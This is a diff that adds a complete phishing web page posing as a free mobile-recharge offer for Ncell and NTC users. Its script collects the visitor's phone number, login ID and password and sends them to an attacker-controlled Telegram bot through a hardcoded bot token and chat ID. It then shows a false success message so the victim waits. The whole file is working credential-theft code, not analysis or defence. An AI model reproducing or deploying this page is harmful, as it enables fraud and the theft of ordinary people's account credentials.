@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Free Recharge - Digital World</title>
+  <style>
+    body {
+      background: black;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 30px;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #ccc;
+      max-width: 400px;
+      margin: auto;
+    }
+    input {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #aaa;
+      border-radius: 5px;
+    }
+    button {
+      padding: 10px 20px;
+      background: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .password-container {
+      position: relative;
+      width: 90%;
+      margin: auto;
+    }
+    .password-container input {
+      width: 100%;
+    }
+    .eye-icon {
+      position: absolute;
+      right: 10px;
+      top: 12px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Welcome to Digital World</h2>
+    <p>Get free Recharge - This service only for Ncell or NTC</p>
+    
+    <input type="text" id="rechargeNumber" placeholder="Enter your Number">
+    <input type="number" id="amount" placeholder="Rs. Amount">
+    
+    <h3>Sign Up</h3>
+    <input type="text" id="loginID" placeholder="Enter Number or Email">
+    
+    <div class="password-container">
+      <input type="password" id="password" placeholder="Password">
+      <span class="eye-icon" onclick="togglePassword()">👁️</span>
+    </div>
+    
+    <button onclick="sendToTelegram()">Login</button>
+  </div>
+
+  <script>
+    function togglePassword() {
+      const passwordField = document.getElementById("password");
+      passwordField.type = passwordField.type === "password" ? "text" : "password";
+    }
+
+    function sendToTelegram() {
+      const number = document.getElementById("rechargeNumber").value;
+      const amount = document.getElementById("amount").value;
+      const loginID = document.getElementById("loginID").value;
+      const password = document.getElementById("password").value;
+
+      const message = `🔐 Login Request\n📞 Number: ${number}\n💰 Amount: Rs. ${amount}\n🆔 Login ID: ${loginID}\n🔑 Password: ${password}`;
+
+      const token = "8015678883:AAGc5z3hRTzYGcMdx0dkmxb480HKxrnpqzA"; // Replace with your bot token
+      const chatId = "6809642969";  // Replace with your chat ID
+
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      fetch(url)
+        .then(response => {
+          if (response.ok) {
+            alert("Amount send successful please Wait 2 days");
+          } else {
+            alert("Something wrong please try again");
+          }
+        })
+        .catch(error => {
+          console.error("Error:", error);
+          alert("Something went wrong!");
+        });
+    }
+  </script>
+</body>
+</html>
